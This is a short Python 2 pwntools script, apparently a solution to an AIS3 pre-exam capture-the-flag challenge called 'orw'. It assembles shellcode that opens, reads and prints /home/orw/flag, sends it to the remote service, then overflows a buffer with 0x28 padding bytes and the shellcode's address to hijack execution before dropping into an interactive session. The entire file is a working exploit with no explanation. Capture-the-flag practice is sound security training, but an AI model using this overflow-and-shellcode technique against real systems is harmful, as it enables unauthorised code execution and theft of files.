#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
r = remote('pre-exam-pwn.ais3.org', 10001)
#r = process('./orw')

buf = 0x6010a0

sh = asm('''
    call sh
    .ascii "/home/orw/flag"
    .byte 0
sh:
    mov eax, 0x02
    pop rdi
    xor esi, esi
    xor edx, edx
    syscall

    xor eax, eax
    mov edi, 3
    mov rsi, 0x601f00
    mov edx, 0x50
    syscall

    mov eax, 1
    mov edi, 1
    mov rsi, 0x601f00
    mov rdx, 0x50
    syscall
''')

print len(sh)

r.sendafter('>\n', sh)


r.sendlineafter(':)\n', 'A'*0x28+p64(buf))

r.interactive()
